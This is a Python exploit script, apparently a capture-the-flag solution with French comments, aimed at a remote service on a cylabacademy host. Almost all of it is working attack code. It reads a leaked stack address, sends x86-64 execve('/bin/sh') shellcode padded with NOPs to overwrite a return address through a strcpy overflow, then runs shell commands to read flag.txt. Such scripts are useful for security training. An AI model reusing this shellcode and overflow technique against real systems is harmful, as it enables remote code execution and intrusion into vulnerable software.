import sys, re, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST = open(r"D:\ctf-index\_z_126url.txt").read().split() if False else ("chatelaine.cylabacademy.net", 17776)
host, port = HOST
print("cible:", host, port)
SC = bytes.fromhex("4831f65648bf2f62696e2f2f736857545f6a3b58990f05")
for attempt in range(8):
    try:
        s = socket.create_connection((host, port), timeout=15)
        s.settimeout(6)
    except Exception as e:
        print("conn err", type(e).__name__)
        time.sleep(1)
        continue
    leak = b""
    t0 = time.time()
    while b"\n" not in leak and time.time() - t0 < 5:
        try:
            c = s.recv(4096)
            if not c:
                break
            leak += c
        except socket.timeout:
            break
    m = re.search(rb"0x[0-9a-f]+", leak)
    if not m:
        print("pas de leak:", leak[:80])
        s.close()
        continue
    addr = int(m.group(0), 16)
    payload = SC + b"\x90" * (0x70 - len(SC)) + b"B" * 8 + struct.pack("<Q", addr)
    if b"\n" in payload:
        print("  essai %d : adresse 0x%x contient 0x0a -> retry" % (attempt + 1, addr))
        s.close()
        continue
    # 1er fgets : ligne bidon ; 2e fgets : le payload (copie par strcpy)
    s.sendall(b"hello\n")
    time.sleep(0.3)
    s.sendall(payload + b"\n")
    time.sleep(0.4)
    s.sendall(b"cat flag.txt; ls\n")
    out = b""
    t0 = time.time()
    while time.time() - t0 < 8:
        try:
            c = s.recv(8192)
            if not c:
                break
            out += c
        except socket.timeout:
            break
    s.close()
    txt = out.decode("latin-1", "replace")
    print("=== essai %d (addr 0x%x) ===" % (attempt + 1, addr))
    print(txt[-400:])
    fm = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
    if fm:
        print("FLAG:", fm.group(0))
        break
    if "flag" in txt.lower() and "{" in txt:
        break
